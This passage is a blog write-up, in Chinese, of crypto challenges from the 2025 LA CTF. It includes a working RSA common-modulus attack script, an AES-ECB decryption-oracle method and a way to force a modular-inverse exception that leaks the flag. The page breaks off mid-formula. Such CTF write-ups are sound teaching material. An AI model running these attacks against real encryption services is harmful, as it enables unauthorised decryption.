<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="en">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT" />










<meta property="og:type" content="website">
<meta property="og:title" content="Welcome To Luhaozhhhe&#39;s Blog!">
<meta property="og:url" content="https://luhaozhhhe.github.io/index.html">
<meta property="og:site_name" content="Welcome To Luhaozhhhe&#39;s Blog!">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="Luhaozhhhe">
<meta name="twitter:card" content="summary">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideDownBigOut"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>






  <link rel="canonical" href="https://luhaozhhhe.github.io/"/>





  <title>Welcome To Luhaozhhhe's Blog!</title>
  








<meta name="generator" content="Hexo 7.3.0"><style>mjx-container[jax="SVG"] {
  direction: ltr;
}

mjx-container[jax="SVG"] > svg {
  overflow: visible;
}

mjx-container[jax="SVG"][display="true"] {
  display: block;
  text-align: center;
  margin: 1em 0;
}

mjx-container[jax="SVG"][justify="left"] {
  text-align: left;
}

mjx-container[jax="SVG"][justify="right"] {
  text-align: right;
}

g[data-mml-node="merror"] > g {
  fill: red;
  stroke: red;
}

g[data-mml-node="merror"] > rect[data-background] {
  fill: yellow;
  stroke: none;
}

g[data-mml-node="mtable"] > line[data-line] {
  stroke-width: 70px;
  fill: none;
}

g[data-mml-node="mtable"] > rect[data-frame] {
  stroke-width: 70px;
  fill: none;
}

g[data-mml-node="mtable"] > .mjx-dashed {
  stroke-dasharray: 140;
}

g[data-mml-node="mtable"] > .mjx-dotted {
  stroke-linecap: round;
  stroke-dasharray: 0,140;
}

g[data-mml-node="mtable"] > svg {
  overflow: visible;
}

[jax="SVG"] mjx-tool {
  display: inline-block;
  position: relative;
  width: 0;
  height: 0;
}

[jax="SVG"] mjx-tool > mjx-tip {
  position: absolute;
  top: 0;
  left: 0;
}

mjx-tool > mjx-tip {
  display: inline-block;
  padding: .2em;
  border: 1px solid #888;
  font-size: 70%;
  background-color: #F8F8F8;
  color: black;
  box-shadow: 2px 2px 5px #AAAAAA;
}

g[data-mml-node="maction"][data-toggle] {
  cursor: pointer;
}

mjx-status {
  display: block;
  position: fixed;
  left: 1em;
  bottom: 1em;
  min-width: 25%;
  padding: .2em .4em;
  border: 1px solid #888;
  font-size: 90%;
  background-color: #F8F8F8;
  color: black;
}

foreignObject[data-mjx-xml] {
  font-family: initial;
  line-height: normal;
  overflow: visible;
}

.MathJax path {
  stroke-width: 3;
}

mjx-container[display="true"] {
  overflow: auto hidden;
}

mjx-container[display="true"] + br {
  display: none;
}
</style></head>

<body itemscope itemtype="http://schema.org/WebPage" lang="en">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Welcome To Luhaozhhhe's Blog!</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">NKUSEer小菜鸡一枚，记录学习笔记、CTF竞赛、学习心得等内容~</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            About
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            Tags
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            Categories
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            Archives
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://luhaozhhhe.github.io/2025/02/10/2025LACTF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Welcome To Luhaozhhhe's Blog!">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2025/02/10/2025LACTF/" itemprop="url">2025LACTF</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2025-02-10T11:30:17+08:00">
                2025-02-10
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/WriteUp/" itemprop="url" rel="index">
                    <span itemprop="name">WriteUp</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>记录一下寒假闲着没事干打的一个国外的比赛，签到题比较多，对我十分友好（bushi）</p>
<p><strong>个人排名：</strong></p>
<p><img src="/images/2025LACTF/image-20250210112757983.png"></p>
<p><strong>个人解答情况：</strong></p>
<p><img src="/images/2025LACTF/image-20250210112817457.png"></p>
<h2 id="crypto">Crypto</h2>
<h3 id="big-e">big e</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, getPrime</span><br><span class="line"></span><br><span class="line">flag = REDACTED</span><br><span class="line"></span><br><span class="line">pt = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line">e_1 = getPrime(<span class="number">16</span>)</span><br><span class="line">e_2 = getPrime(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">ct_1 = <span class="built_in">pow</span>(pt, e_1, n)</span><br><span class="line">ct_2 = <span class="built_in">pow</span>(pt, e_2, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"ct_1 = "</span>, ct_1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"ct_2 = "</span>, ct_2)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">"e_1 = "</span>, e_1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"e_2 = "</span>, e_2)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">"n = "</span>, n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ct_1 =  7003427993343973209633604223157797389179484683813683779456722118278438552981580821629201099609635249903171901413187274301782131604125932440261436398792561279923201353644665062240232628983398769617870021735462687213315384230009597811708620803976743966567909514341685037497925118142192131350408768935124431331080433697691313467918865993755818981120044023483948250730200785386337033076398494691789842346973681951019033860698847693411061368646250415931744527789768875833220281187219666909459057523372182679170829387933194504283746668835390769531217602348382915358689492117524129757929202594190396696326156951763154356777</span></span><br><span class="line"><span class="comment"># ct_2 =  2995334251818636287120912468673386461522795145344535560487265325864722413686091982727438605788851631192187299910519824438553287094479216297828199976116043039048528458879462591368580247044838727287694258607151549844079706204392479194688578102781851646467977751150658542264776551648799517340378173131694653270749425410071080383488918100565955153958793977478719703463115004497213753735577027928062856483316183232075922059366731900291340025009516177568909257605255717594938087543899066756942042664781424833498278544829618874970165660669400140113047048269742309745649848573501494088032718459018143817236079173978684104782</span></span><br><span class="line"><span class="comment"># e_1 =  49043</span></span><br><span class="line"><span class="comment"># e_2 =  60737</span></span><br><span class="line"><span class="comment"># n =  9162219874876832806204248523866163938680921861751582550947065673035037752546476053774362284605943422397285024205866696280912237827227700515353007344062472274717294484810421409217463791112287997964358655519896402380272695026012981743782564008035342746214988154836484419372449523768063368280069515180570625408254410932129769708259508451185553774810385066789146531683973766796965747310893648672657945403825359068647151094841570404979930542270681833162424933411724266687320976217446032292107871449464575533610369244978941764470549091443086646932177141081314452355708815370388814214178980532690792441231698974328523197187</span></span><br></pre></td></tr></table></figure>
<p>一个简单的共模攻击，签到题了算是</p>
<p>直接上py脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">ct_1 = <span class="number">7003427993343973209633604223157797389179484683813683779456722118278438552981580821629201099609635249903171901413187274301782131604125932440261436398792561279923201353644665062240232628983398769617870021735462687213315384230009597811708620803976743966567909514341685037497925118142192131350408768935124431331080433697691313467918865993755818981120044023483948250730200785386337033076398494691789842346973681951019033860698847693411061368646250415931744527789768875833220281187219666909459057523372182679170829387933194504283746668835390769531217602348382915358689492117524129757929202594190396696326156951763154356777</span></span><br><span class="line">ct_2 = <span class="number">2995334251818636287120912468673386461522795145344535560487265325864722413686091982727438605788851631192187299910519824438553287094479216297828199976116043039048528458879462591368580247044838727287694258607151549844079706204392479194688578102781851646467977751150658542264776551648799517340378173131694653270749425410071080383488918100565955153958793977478719703463115004497213753735577027928062856483316183232075922059366731900291340025009516177568909257605255717594938087543899066756942042664781424833498278544829618874970165660669400140113047048269742309745649848573501494088032718459018143817236079173978684104782</span></span><br><span class="line">e_1 = <span class="number">49043</span></span><br><span class="line">e_2 = <span class="number">60737</span></span><br><span class="line">n = <span class="number">9162219874876832806204248523866163938680921861751582550947065673035037752546476053774362284605943422397285024205866696280912237827227700515353007344062472274717294484810421409217463791112287997964358655519896402380272695026012981743782564008035342746214988154836484419372449523768063368280069515180570625408254410932129769708259508451185553774810385066789146531683973766796965747310893648672657945403825359068647151094841570404979930542270681833162424933411724266687320976217446032292107871449464575533610369244978941764470549091443086646932177141081314452355708815370388814214178980532690792441231698974328523197187</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extended_gcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    old_r, r = a, b</span><br><span class="line">    old_s, s = <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    old_t, t = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> r != <span class="number">0</span>:</span><br><span class="line">        quotient = old_r // r</span><br><span class="line">        old_r, r = r, old_r - quotient * r</span><br><span class="line">        old_s, s = s, old_s - quotient * s</span><br><span class="line">        old_t, t = t, old_t - quotient * t</span><br><span class="line">    <span class="keyword">return</span> old_r, old_s, old_t</span><br><span class="line"></span><br><span class="line">gcd, a, b = extended_gcd(e_1, e_2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f"GCD: <span class="subst">{gcd}</span>, a: <span class="subst">{a}</span>, b: <span class="subst">{b}</span>"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算各部分并处理负数指数</span></span><br><span class="line"><span class="keyword">if</span> a &lt; <span class="number">0</span>:</span><br><span class="line">    ct1_inv = <span class="built_in">pow</span>(ct_1, -<span class="number">1</span>, n)</span><br><span class="line">    part1 = <span class="built_in">pow</span>(ct1_inv, -a, n)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    part1 = <span class="built_in">pow</span>(ct_1, a, n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> b &lt; <span class="number">0</span>:</span><br><span class="line">    ct2_inv = <span class="built_in">pow</span>(ct_2, -<span class="number">1</span>, n)</span><br><span class="line">    part2 = <span class="built_in">pow</span>(ct2_inv, -b, n)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    part2 = <span class="built_in">pow</span>(ct_2, b, n)</span><br><span class="line"></span><br><span class="line">m = (part1 * part2) % n</span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<p><img src="/images/2025LACTF/image-20250208153227274.png"></p>
<p>得到flag：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lactf{b1g_3_but_sm4ll_d!!!_part2_since_i_trolled}</span><br></pre></td></tr></table></figure>
<h3 id="extremely-convenient-breaker">Extremely Convenient Breaker</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/local/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">key = os.urandom(<span class="number">16</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">"flag.txt"</span>, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag = f.readline().strip()</span><br><span class="line">cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">flag_enc = cipher.encrypt(flag.encode())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"Here's the encrypted flag in hex: "</span>)</span><br><span class="line"><span class="built_in">print</span>(flag_enc.<span class="built_in">hex</span>())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"Alright, lemme spin up my Extremely Convenient Breaker (trademark copyright all rights reserved). "</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    ecb = <span class="built_in">input</span>(<span class="string">"What ciphertext do you want me to break in an extremely convenient manner? Enter as hex: "</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ecb = <span class="built_in">bytes</span>.fromhex(ecb)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">len</span>(ecb) == <span class="number">64</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"Sorry, it's not *that* convenient. Make your ciphertext 64 bytes please. "</span>)</span><br><span class="line">        <span class="keyword">elif</span> ecb == flag_enc:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"No, I'm not decrypting the flag. "</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(cipher.decrypt(ecb))</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"Uh something went wrong, please try again. "</span>)</span><br></pre></td></tr></table></figure>
<p>一个简单的AES，连接远程之后，会给你一个将flag加密的hex字符串</p>
<p>我们只需要改变其中的某一位hex值，就可以还原部分结果出来，多尝试几次就还原出全部的flag了</p>
<p>前半部分：</p>
<p><img src="/images/2025LACTF/image-20250208152917761.png"></p>
<p>后半部分：</p>
<p><img src="/images/2025LACTF/image-20250208152943029.png"></p>
<p>完整的flag为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lactf{seems_it_was_extremely_convenient_to_get_the_flag_too_heh}</span><br></pre></td></tr></table></figure>
<h3 id="rsaaas">RSAaaS</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/local/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> isPrime</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">RSAaaS</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"Welcome to my RSA as a Service! "</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"Pass me two primes and I'll do the rest for you. "</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"Let's keep the primes at a 64 bit size, please. "</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            p = <span class="built_in">input</span>(<span class="string">"Input p: "</span>)</span><br><span class="line">            q = <span class="built_in">input</span>(<span class="string">"Input q: "</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                p = <span class="built_in">int</span>(p)</span><br><span class="line">                q = <span class="built_in">int</span>(q)</span><br><span class="line">                <span class="keyword">assert</span> isPrime(p)</span><br><span class="line">                <span class="keyword">assert</span> isPrime(q)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">"Hm, looks like something's wrong with the primes you sent. "</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">"Please try again. "</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">assert</span> p != q</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">"You should probably make your primes different. "</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">assert</span> (p &gt; <span class="number">2</span>**<span class="number">63</span>) <span class="keyword">and</span> (p &lt; <span class="number">2</span>**<span class="number">64</span>)</span><br><span class="line">                <span class="keyword">assert</span> (q &gt; <span class="number">2</span>**<span class="number">63</span>) <span class="keyword">and</span> (q &lt; <span class="number">2</span>**<span class="number">64</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">"Please keep your primes in the requested size range. "</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">"Please try again. "</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        n = p * q</span><br><span class="line">        phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">        e = <span class="number">65537</span></span><br><span class="line">        d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, phi)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"Alright! RSA is all set! "</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"1. Encrypt 2. Decrypt 3. Exit "</span>)</span><br><span class="line">            choice = <span class="built_in">input</span>(<span class="string">"Pick an option: "</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> choice == <span class="string">"1"</span>:</span><br><span class="line">                msg = <span class="built_in">input</span>(<span class="string">"Input a message (as an int): "</span>)</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    msg = <span class="built_in">int</span>(msg)</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">"Hm, looks like something's wrong with your message. "</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                encrypted = <span class="built_in">pow</span>(msg, e, n)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">"Here's your ciphertext! "</span>)</span><br><span class="line">                <span class="built_in">print</span>(encrypted)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> choice == <span class="string">"2"</span>:</span><br><span class="line">                ct = <span class="built_in">input</span>(<span class="string">"Input a ciphertext (as an int): "</span>)</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    ct = <span class="built_in">int</span>(ct)</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">"Hm, looks like something's wrong with your message. "</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                decrypted = <span class="built_in">pow</span>(ct, d, n)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">"Here's your plaintext! "</span>)</span><br><span class="line">                <span class="built_in">print</span>(decrypted)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">"Thanks for using my service! "</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">"Buh bye! "</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"Oh no! My service! Please don't give us a bad review! "</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"Here, have a complementary flag for your troubles. "</span>)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">"flag.txt"</span>, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="built_in">print</span>(f.read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RSAaaS()</span><br></pre></td></tr></table></figure>
<p>一个交互题，和之前有个题很像，就是要找出代码的异常之处，触发异常就可以</p>
<p>我们发现一些简单的异常，代码都帮我们排除了，所以我们只能在其他的代码段触发异常</p>
<p>定位到这一段代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">n = p * q</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, phi)</span><br></pre></td></tr></table></figure>
<p>求d的时候，可能会出现没有逆元的情况，之前也做过类似的题，就是e与phi不互素的情况</p>
<p>那我们只需要找出合适的p和q，不触发代码中约束的异常，但是触发这个逆元异常就可以了</p>
<p>暴力穷举一下范围内的素数，找到了一个合适的p，满足： <span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="18.484ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 8170 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(389,0)"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g><g data-mml-node="mo" transform="translate(1114.2,0)"><path data-c="2212" 